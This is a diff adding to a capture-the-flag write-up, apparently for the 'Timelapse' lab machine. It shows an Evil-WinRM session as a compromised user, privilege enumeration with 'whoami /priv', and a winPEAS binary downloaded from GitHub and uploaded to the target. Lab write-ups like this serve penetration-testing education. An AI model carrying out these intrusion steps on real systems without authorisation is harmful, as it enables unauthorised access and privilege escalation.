@@ -292,7 +292,45 @@ timelapse\legacyy
 
 <br>
 
-And we're in :)
+And we're in :) <br>
+Now for privesc.
 
 <br>
 
+```
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv
+Enter PEM pass phrase:
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+<br>
+
+I used winPEAS 
+
+```
+[connor@fedora timelapse]$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220612/winPEASx86.exe
+```
+
+<br>
+
+```
+*Evil-WinRM* PS C:\Users\legacyy\Documents> upload winPEASx86.exe
+Info: Uploading winPEASx86.exe to C:\Users\legacyy\Documents\winPEASx86.exe
+
+Enter PEM pass phrase:
+                                                             
+Data: 2582528 bytes of 2582528 bytes copied
+
+Info: Upload successful!
+
+```
+
+<br>
